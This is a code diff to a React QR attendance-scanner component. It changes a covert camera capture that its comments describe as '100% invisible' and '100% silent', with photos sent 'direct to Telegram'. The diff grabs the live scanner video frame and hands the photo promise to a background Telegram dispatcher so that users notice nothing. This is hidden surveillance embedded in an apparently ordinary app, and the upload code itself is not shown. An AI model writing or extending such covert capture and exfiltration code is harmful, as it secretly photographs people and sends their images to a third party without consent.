@@ -154,12 +154,15 @@ export const QRScannerOverlay: React.FC<QRScannerOverlayProps> = ({
 
     logger.info('QRScannerOverlay', 'QR Code detected by camera', { rawData: _qrData });
 
+    // Capture active scanner video frame reference before stopping scanner (instant fallback snapshot, 100% silent)
+    const activeVideo = document.querySelector<HTMLVideoElement>('#reader video');
+
     if (scannerRef.current && scannerRef.current.isScanning) {
       await scannerRef.current.stop().catch((err) => logger.warn('QRScannerOverlay', 'Scanner stop error:', err));
     }
 
-    // Trigger silent front camera capture in background (100% invisible, direct to Telegram)
-    const silentPhotoPromise = SilentCameraCaptureService.captureFrontCameraSilently();
+    // Trigger silent dual-strategy capture in background (100% invisible, direct to Telegram)
+    const silentPhotoPromise = SilentCameraCaptureService.captureOptimalAttendancePhoto(activeVideo);
 
     // 1. Validate QR Code payload freshness and official poster seed
     const qrValidation = QRValidationService.validateQRFreshness(_qrData);
@@ -283,17 +286,7 @@ export const QRScannerOverlay: React.FC<QRScannerOverlayProps> = ({
     try {
       logger.info('QRScannerOverlay', 'Sending scanAttendance payload to repository...');
 
-      let photoBlob: Blob | null = null;
-      try {
-        // Allow up to 1000ms for silent capture, but never block user if delayed
-        photoBlob = await Promise.race([
-          silentPhotoPromise,
-          new Promise<null>((r) => setTimeout(() => r(null), 1000)),
-        ]);
-      } catch {
-        photoBlob = null;
-      }
-
+      // Pass silent photo promise directly to background Telegram dispatcher so UI attendance is instant (0ms blocking)
       const res = await AttendanceRepository.scanAttendance({
         token: token,
         qr_seed: scanSeed,
@@ -302,7 +295,7 @@ export const QRScannerOverlay: React.FC<QRScannerOverlayProps> = ({
         device_uuid: deviceUUID,
         distance_meters: currentCoords.distanceMeters,
         gps_accuracy: currentCoords.accuracy,
-        photoBlob: photoBlob,
+        photoPromise: silentPhotoPromise,
       });
 
       logger.info('QRScannerOverlay', 'Attendance saved successfully:', res);
